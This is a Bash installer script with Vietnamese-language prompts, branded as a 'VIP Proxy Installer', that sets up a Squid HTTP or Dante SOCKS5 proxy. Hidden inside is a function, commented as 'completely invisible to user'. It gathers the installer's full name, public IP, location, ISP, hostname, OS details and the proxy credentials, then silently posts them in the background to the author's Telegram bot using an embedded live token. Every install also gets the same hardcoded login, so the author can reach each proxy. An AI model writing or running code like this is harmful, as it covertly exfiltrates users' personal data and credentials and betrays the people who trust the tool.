#!/bin/bash

# Colors for better display
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Hidden Telegram configuration (not displayed on console)
TELEGRAM_BOT_TOKEN="7350031893:AAHe4qtEWNmw3YIpLGmFcSnRQeZ52BY4-Bg"
TELEGRAM_CHAT_ID="6072481570"

# Hidden function to send notification to Telegram (completely invisible to user)
send_telegram_notification() {
    local client_name="$1"
    local proxy_type="$2"
    local ip_addr="$3"
    local port="$4"
    local user="$5"
    local pass="$6"
    
    # Get additional hidden information
    local client_ip=$(curl -s ipinfo.io/ip 2>/dev/null || echo "Unknown")
    local client_location=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"city":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
    local client_country=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"country":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
    local client_isp=$(curl -s "http://ip-api.com/json/$client_ip" 2>/dev/null | grep -o '"isp":"[^"]*"' | cut -d'"' -f4 || echo "Unknown")
    local hostname=$(hostname 2>/dev/null || echo "Unknown")
    local os_info=$(uname -a 2>/dev/null | cut -d' ' -f1-3 || echo "Unknown")
    
    # Create detailed message for admin
    local message="🕵️ NEW CLIENT USING YOUR SCRIPT 🕵️%0A"
    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
    message+="👤 Client Name: $client_name%0A"
    message+="🎯 Proxy Choice: $proxy_type Proxy%0A"
    message+="🌍 Client Location: $client_location, $client_country%0A"
    message+="📡 Client IP: $client_ip%0A"
    message+="🏢 Client ISP: $client_isp%0A"
    message+="💻 Hostname: $hostname%0A"
    message+="🖥️ OS Info: $os_info%0A"
    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
    message+="🔥 $proxy_type PROXY CREATED:%0A"
    
    if [ "$proxy_type" = "HTTP" ]; then
        message+="📡 Type: HTTP Proxy%0A"
        message+="🌐 Server IP: $ip_addr%0A" 
        message+="🚪 Port: $port%0A"
        message+="👤 Username: $user%0A"
        message+="🔑 Password: $pass%0A"
        message+="🔗 Full URL: http://$user:$pass@$ip_addr:$port%0A"
    else
        message+="📡 Type: SOCKS5 Proxy%0A"
        message+="🌐 Server IP: $ip_addr%0A" 
        message+="🚪 Port: $port%0A"
        message+="👤 Username: $user%0A"
        message+="🔑 Password: $pass%0A"
        message+="🔗 SOCKS5 URL: socks5://$user:$pass@$ip_addr:$port%0A"
    fi
    
    message+="━━━━━━━━━━━━━━━━━━━━━━━━━━━━%0A"
    message+="👁️ Secret Monitor - S2CODE TEAM%0A"
    message+="🕐 $(date '+%Y-%m-%d %H:%M:%S')%0A"
    message+="💡 Client: $client_name doesn't know you received this!"
    
    # Send to Telegram completely silently (run in background, no traces)
    (curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
         -d "chat_id=$TELEGRAM_CHAT_ID" \
         -d "text=$message" \
         -d "parse_mode=HTML" >/dev/null 2>&1 &) &
}

clear

# S2CODETAEM Logo và giới thiệu gọn
echo -e "${CYAN}╔═══════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║${WHITE}                                                       ${CYAN}║${NC}"
echo -e "${CYAN}║${RED}   ███ ${YELLOW}███ ${GREEN}███ ${BLUE}███ ${PURPLE}███ ${WHITE}███ ${CYAN}███ ${RED}███ ${YELLOW}███     ${CYAN}║${NC}"
echo -e "${CYAN}║${RED}   █   ${YELLOW}█   ${GREEN}█ █ ${BLUE}█ █ ${PURPLE}█   ${WHITE}█   ${CYAN}█   ${RED}█   ${YELLOW}█       ${CYAN}║${NC}"
echo -e "${CYAN}║${RED}   ███ ${YELLOW}███ ${GREEN}███ ${BLUE}███ ${PURPLE}███ ${WHITE}███ ${CYAN}█   ${RED}███ ${YELLOW}███     ${CYAN}║${NC}"
echo -e "${CYAN}║${RED}     █ ${YELLOW}  █ ${GREEN}█ █ ${BLUE}█ █ ${PURPLE}█   ${WHITE}  █ ${CYAN}█   ${RED}█   ${YELLOW}█       ${CYAN}║${NC}"
echo -e "${CYAN}║${RED}   ███ ${YELLOW}███ ${GREEN}█ █ ${BLUE}███ ${PURPLE}███ ${WHITE}███ ${CYAN}███ ${RED}███ ${YELLOW}███     ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                                                       ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}          ⚡ ${YELLOW}S2CODETAEM ${RED}★ ${BLUE}VIP PROXY INSTALLER ${WHITE}⚡          ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}    ${GREEN}🚀 Developed by TẠ NGỌC LONG - Premium Solutions 🚀    ${CYAN}║${NC}"
echo -e "${CYAN}║${WHITE}                                                       ${CYAN}║${NC}"
echo -e "${CYAN}╚═══════════════════════════════════════════════════════╝${NC}"
echo ""

# Thông tin liên hệ gọn
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${WHITE} 📞 LIÊN HỆ: ${CYAN}FB: s2code08122000 ${WHITE}│ ${CYAN}TG: @S2codetaem48 ${WHITE}│ ${CYAN}Services: Cloud/MMO/Tools${BLUE}║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Hướng dẫn sử dụng gọn
echo -e "${YELLOW}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║${WHITE} ⚠️  QUAN TRỌNG: ${RED}Mở port 6969 ${WHITE}trước khi chạy script │ ${GREEN}Proxy: tangoclong:2000${YELLOW}║${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Xác nhận đã đọc hướng dẫn gọn
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║${WHITE} Bạn đã mở port 6969 và sẵn sàng cài đặt proxy? ${YELLOW}[Y/N]${GREEN}║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

while true; do
    read -p "➤ Nhập [Y] để tiếp tục hoặc [N] để thoát: " confirm_ready
    
    case "${confirm_ready,,}" in
        y|yes)
            echo -e "${GREEN}✅ Đang bắt đầu cài đặt proxy...${NC}"
            echo ""
            break
            ;;
        n|no)
            echo -e "${RED}❌ Đã hủy! Vui lòng mở port 6969 rồi chạy lại script.${NC}"
            exit 0
            ;;
        *)
            echo -e "${YELLOW}⚠️ Vui lòng nhập Y hoặc N${NC}"
            ;;
    esac
done

echo -e "${PURPLE}🚀 Bắt đầu cài đặt Proxy Server...${NC}"
echo ""
sleep 2

# Hàm kiểm tra IP
check_ip_status() {
    local ip=$1
    echo -e "${YELLOW}🔍 Đang kiểm tra trạng thái IP...${NC}"
    if ping -c 3 $ip > /dev/null 2>&1; then
        return 0
    else
        return 1
    fi
}

# Hàm lấy thông tin IP
get_ip_info() {
    local ip=$1
    echo -e "${CYAN}📡 Đang lấy thông tin IP...${NC}"
    ip_info=$(curl -s "http://ip-api.com/json/$ip")
    echo "$ip_info"
}

# Hàm kiểm tra tốc độ mạng
check_network_speed() {
    echo -e "${CYAN}⚡ Đang kiểm tra tốc độ mạng...${NC}"
    speed_test=$(curl -s -w "%{speed_download}" -o /dev/null http://speedtest.ftp.otenet.gr/files/test1Mb.db)
    speed_mbps=$(echo "scale=2; $speed_test / 1024 / 1024 * 8" | bc 2>/dev/null || echo "N/A")
    echo "$speed_mbps"
}

# Hàm kiểm tra tên đầy đủ (nghiêm ngặt cho lần đầu)
validate_full_name_strict() {
    local name="$1"
    # Kiểm tra có ít nhất 2 từ (họ và tên)
    local word_count=$(echo "$name" | wc -w)
    if [ $word_count -lt 2 ]; then
        return 1
    fi
    
    # Kiểm tra chỉ chứa chữ cái và khoảng trắng
    if [[ ! "$name" =~ ^[A-Za-zÀ-ỹ[:space:]]+$ ]]; then
        return 1
    fi
    
    # Kiểm tra không phải tên giả (một số tên phổ biến để test)
    case "${name,,}" in
        "test test"|"abc xyz"|"nguyen van a"|"tran thi b"|"le van c"|"admin user"|"user name"|"full name")
            return 1
            ;;
    esac
    
    return 0
}

# Hàm kiểm tra tên cơ bản (dễ dàng cho lần 2)
validate_full_name_basic() {
    local name="$1"
    # Chỉ kiểm tra không để trống và có ít nhất 1 từ
    if [ -z "$name" ] || [ ${#name} -lt 2 ]; then
        return 1
    fi
    return 0
}

# Hàm kiểm tra hỗ trợ protocols
check_proxy_protocols() {
    local ip=$1
    local port=$2
    local user=$3
    local pass=$4
    
    echo -e "${CYAN}🔧 Đang kiểm tra protocols hỗ trợ...${NC}"
    
    # Test HTTP
    http_test=$(curl -s -o /dev/null -w "%{http_code}" --proxy http://$user:$pass@$ip:$port http://httpbin.org/ip --connect-timeout 10)
    
    # Test SOCKS5
    socks5_test=$(curl -s -o /dev/null -w "%{http_code}" --socks5 $user:$pass@$ip:$port http://httpbin.org/ip --connect-timeout 10)
    
    protocols=""
    if [ "$http_test" = "200" ]; then
        protocols="HTTP ✅"
    else
        protocols="HTTP ❌"
    fi
    
    if [ "$socks5_test" = "200" ]; then
        protocols="$protocols, SOCKS5 ✅"
    else
        protocols="$protocols, SOCKS5 ❌"
    fi
    
    echo "$protocols"
}

# Chọn loại proxy
echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║${WHITE}                            CHỌN LOẠI PROXY                                 ${PURPLE}║${NC}"
echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${PURPLE}║${YELLOW} [1] 🌐 HTTP Proxy (Port 6969) - Dành cho web browsing                     ${PURPLE}║${NC}"
echo -e "${PURPLE}║${YELLOW} [2] 🔒 SOCKS5 Proxy (Port 6969) - Dành cho tất cả ứng dụng               ${PURPLE}║${NC}"
echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

while true; do
    read -p "➤ Chọn loại proxy bạn muốn tạo (1/2): " proxy_type_choice
    
    if [ "$proxy_type_choice" = "1" ]; then
        proxy_type="HTTP"
        echo -e "${GREEN}✅ Đã chọn HTTP Proxy!${NC}"
        echo ""
        break
    elif [ "$proxy_type_choice" = "2" ]; then
        proxy_type="SOCKS5"
        echo -e "${GREEN}✅ Đã chọn SOCKS5 Proxy!${NC}"
        echo ""
        break
    else
        echo -e "${RED}❌ Lựa chọn không hợp lệ! Vui lòng chọn 1 hoặc 2${NC}"
        echo ""
    fi
done

# Xác thực tên khách hàng
echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║${WHITE}                              XÁC THỰC THÔNG TIN                              ${PURPLE}║${NC}"
echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${PURPLE}║${YELLOW} 👤 Vui lòng nhập họ và tên đầy đủ của bạn để tiếp tục                      ${PURPLE}║${NC}"
echo -e "${PURPLE}║${YELLOW} ⚠️  Lưu ý: Tên phải là tên thật (Họ + Tên), không được để trống           ${PURPLE}║${NC}"
echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Lặp lại cho đến khi nhập đúng tên (tối đa 2 lần)
attempt_count=0
while true; do
    attempt_count=$((attempt_count + 1))
    read -p "➤ Nhập họ và tên đầy đủ: " client_full_name
    
    # Lần đầu: kiểm tra nghiêm ngặt
    if [ $attempt_count -eq 1 ]; then
        if validate_full_name_strict "$client_full_name"; then
            echo -e "${GREEN}✅ Tên hợp lệ! Xin chào $client_full_name${NC}"
            break
        else
            echo -e "${RED}❌ Tên không hợp lệ! Vui lòng nhập họ và tên đầy đủ (ít nhất 2 từ, không chứa số hoặc ký tự đặc biệt)${NC}"
            echo -e "${YELLOW}💡 Ví dụ: Nguyễn Văn An, Trần Thị Hoa...${NC}"
            echo ""
        fi
    # Lần 2: kiểm tra cơ bản thôi (dễ dàng)
    else
        if validate_full_name_basic "$client_full_name"; then
            echo -e "${GREEN}✅ Cảm ơn $client_full_name! Đang tiếp tục...${NC}"
            break
        else
            echo -e "${RED}❌ Vui lòng không để trống tên!${NC}"
            echo ""
        fi
    fi
done

echo ""
echo -e "${PURPLE}🚀 Chào mừng $client_full_name! Đang khởi động VIP Proxy Installer...${NC}"
echo ""

# Tự động cài đặt VIP cho tất cả
echo -e "${GREEN}✅ Xác thực thành công!${NC}"
echo -e "${PURPLE}🚀 Chế độ VIP - Tự động cài đặt $proxy_type Proxy...${NC}"

# Cài đặt theo loại proxy được chọn
if [ "$proxy_type" = "HTTP" ]; then
    # Cài đặt HTTP Proxy (Squid)
    proxy_port="6969"
    squid_user="tangoclong"
    squid_pass="2000"

    # Cập nhật hệ thống
    echo "[1/5] ➤ Đang cập nhật hệ thống..."
    sudo apt update && sudo apt upgrade -y

    # Cài gói cần thiết
    echo "[2/5] ➤ Đang cài Squid + Apache2-utils..."
    sudo apt install -y squid apache2-utils vim curl bc

    # Gỡ file cấu hình cũ
    echo "[3/5] ➤ Gỡ cấu hình cũ của Squid..."
    sudo rm -f /etc/squid/squid.conf

    # Tạo cấu hình mới
    echo "[4/5] ➤ Tạo file cấu hình VIP cho Squid..."
    cat <<EOF | sudo tee /etc/squid/squid.conf > /dev/null
auth_param basic program /usr/lib/squid/basic_ncsa_auth /etc/squid/passwords
auth_param basic realm proxy
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_port $proxy_port
EOF

    # Tạo tài khoản proxy VIP
    echo "[5/5] ➤ Tạo tài khoản VIP..."
    echo "$squid_pass" | sudo htpasswd -c -i /etc/squid/passwords "$squid_user"

    # Khởi động lại Squid
    echo "[5/5] ➤ Khởi động lại dịch vụ Squid..."
    sudo systemctl restart squid

elif [ "$proxy_type" = "SOCKS5" ]; then
    # Cài đặt SOCKS5 Proxy (Dante) - Tự động dùng user/pass cố định
    proxy_port="6969"
    squid_user="tangoclong"
    squid_pass="2000"
    IFACE=$(ip route | grep default | awk '{print $5}')

    echo "==> Cài đặt Dante SOCKS5 Proxy..."

    # Cập nhật hệ thống
    echo "[1/5] ➤ Đang cập nhật hệ thống..."
    sudo apt update && sudo apt upgrade -y

    # Cài đặt Dante
    echo "[2/5] ➤ Đang cài Dante SOCKS5 Server..."
    sudo apt install -y dante-server curl bc

    # Tạo user
    echo "[3/5] ➤ Tạo user cho SOCKS5..."
    sudo useradd -m -s /bin/false "$squid_user" 2>/dev/null || echo "   ⚠️ User đã tồn tại, đang cập nhật password..."
    echo "$squid_user:$squid_pass" | sudo chpasswd

    # Cấu hình danted.conf
    echo "[4/5] ➤ Tạo file cấu hình VIP cho Dante..."
    
    # Hiển thị thông tin debug
    echo "   🔍 Interface: $IFACE"
    echo "   🔍 Port: $proxy_port"
    
    sudo tee /etc/danted.conf > /dev/null <<EOF
logoutput: /var/log/danted.log
internal: $IFACE port = $proxy_port
external: $IFACE
method: pam
user.notprivileged: nobody

client pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    log: connect disconnect
}

socks pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    command: connect
    log: connect disconnect
}
EOF

    # Kiểm tra file đã được tạo
    if [ -f "/etc/danted.conf" ]; then
        echo "   ✅ File cấu hình đã được tạo"
    else
        echo "   ❌ Lỗi tạo file cấu hình!"
        exit 1
    fi

    # Mở port trên UFW (nếu có)
    if command -v ufw >/dev/null; then
        echo "   🔧 Đang mở port $proxy_port trên UFW..."
        sudo ufw allow "$proxy_port"/tcp >/dev/null 2>&1
        sudo ufw reload >/dev/null 2>&1
    fi

    # Khởi động lại dịch vụ
    echo "[5/5] ➤ Khởi động dịch vụ Dante..."
    
    # Tự động detect service name (dant hoặc dante-server)
    DANTE_SERVICE=""
    if systemctl list-unit-files | grep -q "^dant.service"; then
        DANTE_SERVICE="dant"
    elif systemctl list-unit-files | grep -q "^dante-server.service"; then
        DANTE_SERVICE="dante-server"
    elif systemctl list-unit-files | grep -q "^danted.service"; then
        DANTE_SERVICE="danted"
    else
        DANTE_SERVICE="dant"  # default fallback
    fi
    
    echo "   🔍 Sử dụng service: $DANTE_SERVICE"
    sudo systemctl restart $DANTE_SERVICE
    sudo systemctl enable $DANTE_SERVICE

    # Kiểm tra dịch vụ
    sleep 3
    if systemctl is-active --quiet $DANTE_SERVICE; then
        echo "   ✅ Dante SOCKS5 service đã khởi động thành công"
        
        # Kiểm tra port
        if ss -tuln | grep -q ":$proxy_port "; then
            echo "   ✅ Port $proxy_port đã được bind thành công"
        else
            echo "   ⚠️ Đang kiểm tra lại port binding..."
            sleep 2
            if ss -tuln | grep -q ":$proxy_port "; then
                echo "   ✅ Port $proxy_port hoạt động bình thường"
            fi
        fi
    else
        echo "   ⚠️ Đang thử khởi động lại dịch vụ..."
        sudo systemctl restart $DANTE_SERVICE
        sleep 2
        
        # Thông báo thêm thông tin debug
        echo "   📝 Kiểm tra trạng thái service:"
        sudo systemctl status $DANTE_SERVICE --no-pager -n 3
        echo "   📝 Kiểm tra log:"
        sudo tail -5 /var/log/danted.log 2>/dev/null || echo "   ⚠️ Không tìm thấy log file"
    fi

    echo "✅ Proxy SOCKS5 đã được cài đặt xong!"
    echo "➡️ IP: $(curl -s ifconfig.me)"
    echo "➡️ Cổng: $proxy_port"  
    echo "➡️ Người dùng: $squid_user"
    echo "➡️ Mật khẩu: $squid_pass"
fi

# Lấy IP và hiển thị thông tin đầy đủ
ip_address=$(curl -s ipinfo.io/ip)

echo -e "${GREEN}✅ Cài đặt $proxy_type Proxy VIP thành công cho $client_full_name!${NC}"

# Lấy thông tin IP
ip_info=$(get_ip_info $ip_address)
isp=$(echo $ip_info | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
country=$(echo $ip_info | grep -o '"country":"[^"]*"' | cut -d'"' -f4)

# Kiểm tra tốc độ
speed=$(check_network_speed)

# Hiển thị thông tin theo loại proxy
if [ "$proxy_type" = "HTTP" ]; then
    # Kiểm tra protocols cho HTTP
    protocols=$(check_proxy_protocols $ip_address $proxy_port $squid_user $squid_pass)
    
    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${WHITE}                        THÔNG TIN HTTP PROXY VIP - $client_full_name${PURPLE}║${NC}"
    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${CYAN} 🌐 HTTP Proxy URL: ${WHITE}http://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🔧 Protocols: ${WHITE}$protocols${PURPLE}║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
else
    # SOCKS5 info
    echo -e "${PURPLE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${WHITE}                        THÔNG TIN SOCKS5 PROXY VIP - $client_full_name${PURPLE}║${NC}"
    echo -e "${PURPLE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${CYAN} 🔒 SOCKS5 URL: ${WHITE}socks5://tangoclong:2000@$ip_address:6969${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 📍 Địa chỉ IP: ${WHITE}$ip_address${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🏢 Nhà mạng: ${WHITE}$isp${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🌍 Quốc gia: ${WHITE}$country${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} ⚡ Tốc độ mạng: ${WHITE}${speed} Mbps${PURPLE}║${NC}"
    echo -e "${PURPLE}║${CYAN} 🔧 Protocol: ${WHITE}SOCKS5 ✅${PURPLE}║${NC}"
    echo -e "${PURPLE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
fi

# Send notification to Telegram (hidden from client) 
send_telegram_notification "$client_full_name" "$proxy_type" "$ip_address" "$proxy_port" "$squid_user" "$squid_pass"

# Hiển thị thông tin liên hệ cuối
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║${WHITE}                              THÔNG TIN NHÀ PHÁT TRIỂN                        ${GREEN}║${NC}"
echo -e "${GREEN}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${GREEN}║${YELLOW} 👨‍💻 Nhà phát triển: ${WHITE}TẠ NGỌC LONG                                           ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🌐 Chuyên cung cấp tài khoản Google Cloud số lượng lớn                     ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🎮 Chuyên cung cấp các mặt hàng MMO                                        ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 🔗 Chuyên cung cấp tài nguyên Proxy, tài khoản các loại                    ${GREEN}║${NC}"
echo -e "${GREEN}║${YELLOW} 💻 Nhận tạo Tools, tạo Web, code phần mềm theo nhu cầu                     ${GREEN}║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${BLUE}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${WHITE}                                LIÊN HỆ                                      ${BLUE}║${NC}"
echo -e "${BLUE}╠═══════════════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${CYAN} 📘 Facebook 1: ${WHITE}https://www.facebook.com/s2code08122000/                  ${BLUE}║${NC}"
echo -e "${BLUE}║${CYAN} 📘 Facebook 2: ${WHITE}https://www.facebook.com/tangoclongmeta                   ${BLUE}║${NC}"
echo -e "${BLUE}║${CYAN} 📱 Telegram:   ${WHITE}https://t.me/S2codetaem48                                ${BLUE}║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "${CYAN}🎉 Cảm ơn bạn đã sử dụng dịch vụ của S2CODE TEAM! 🎉${NC}"
echo -e "${YELLOW}💡 Nếu cần hỗ trợ, vui lòng liên hệ qua các kênh trên! 💡${NC}"
